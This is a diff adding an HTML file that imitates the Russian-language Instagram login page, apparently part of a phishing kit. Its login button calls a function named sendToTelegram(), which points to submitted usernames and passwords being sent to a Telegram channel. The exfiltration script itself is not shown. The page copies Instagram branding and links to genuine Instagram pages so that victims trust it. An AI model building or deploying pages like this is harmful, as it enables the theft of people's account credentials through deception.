@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="icon" type="image/png" href="./a39858011887b289e54ee4883abce777.jpg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <img src="./image-removebg-preview (30).png" alt="Instagram Logo" class="logo">
+            <input type="text" id="username" placeholder="Телефон, имя пользователя или эл. адрес">
+            <div class="password-container">
+                <input type="password" id="password" placeholder="Пароль">
+                <button type="button" id="toggle-password" class="toggle-password">Показать</button>
+            </div>
+            
+
+            <button class="login-btn" onclick="sendToTelegram()">Войти</button>
+            <div class="separator">
+                <span>ИЛИ</span>
+            </div>
+            <!-- Ссылка на авторизацию через Facebook -->
+            <img src="./image-removebg-preview (34).png" alt="Facebook Logo" class="fb-logo">
+            <div class="fb-login"> <a href="https://www.facebook.com/v12.0/dialog/oauth?client_id=YOUR_APP_ID&redirect_uri=YOUR_REDIRECT_URI" class="voit">
+                Войти через Facebook
+            </a>
+            </div>
+            <p id="error-message" class="error-message"></p> <!-- Ошибка теперь здесь -->
+            <a href="https://www.instagram.com/accounts/password/reset/?next=%2Fkse_2606%2F&locale=ru" class="forgot">Забыли пароль?</a>
+        </div>
+        <div class="register-box">
+            У вас нет аккаунта? <a href="https://www.instagram.com/accounts/emailsignup/?next=%2Fkse_2606%2F&locale=ru">Зарегистрироваться</a>
+        </div>
+
+        <div class="app-links">
+            <p>Установите приложение.</p>
+            <div class="buttons">
+                <a href="https://play.google.com/store/search?q=instagram&c=apps&hl=ru" target="_blank">
+                    <img class="google" src="./gp-1.png" alt="g">
+                </a>
+                <a href="https://apps.apple.com/us/app/instagram/id389801252" target="_blank">
+                    <img  class="app" src="./appstore.png"  alt="a">
+                </a>
+            </div>
+        </div>
+        
+    </div>
+
+    <footer>
+        <p>Meta · Информация · Блог · Вакансии · API · Конфиденциальность · Условия</p>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
